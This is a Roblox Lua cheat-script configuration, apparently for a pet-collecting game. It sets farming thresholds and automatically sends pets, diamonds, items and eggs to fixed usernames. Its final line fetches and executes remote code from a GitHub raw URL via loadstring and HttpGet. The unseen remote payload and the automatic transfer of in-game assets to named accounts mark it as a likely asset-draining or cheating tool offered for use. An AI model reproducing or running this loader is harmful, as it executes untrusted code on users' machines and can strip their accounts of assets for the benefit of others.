getgenv().Config = {
    DPS_THRESHOLDS = {
        HOUSE1 = { '>0' },
        HOUSE2 = { '>1000' },
        HOUSE3 = { '6000~14000', '>14000' },
        HOUSE4 = { '14000~20000', '>23000' },
        HOUSE5 = { '>23000' },
        HOUSE6 = { '>26000' },
    },

    plant = {
        PET_SLOTS = { 1, 2, 3, 4, 5, 6, 7, 8, 9 }, -- slot đặt pet
        EGG_SLOTS = { 10 }, -- slot đặt trứng
    },

    SEND_PET = {
        Usernames = { 'TunTrapBoy' },
        PetSendInterval = 20,
        SEND_ALL = true,
        Name_Pet = {},
    },

    SEND_DIAMONDS = {
        Usernames = { 'DreamSoCow' },
        MinDiamonds = 100000000,
    },

    SEND_ITEM = {
        Usernames = { '' },
        ['Spectral Potion'] = { amount = 3 },
    },

    SEND_EGGS = {
        Usernames = { 'TunTrapBoy' },
        ['Exclusive Egg 56'] = true,
    },
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/track.lua"))()
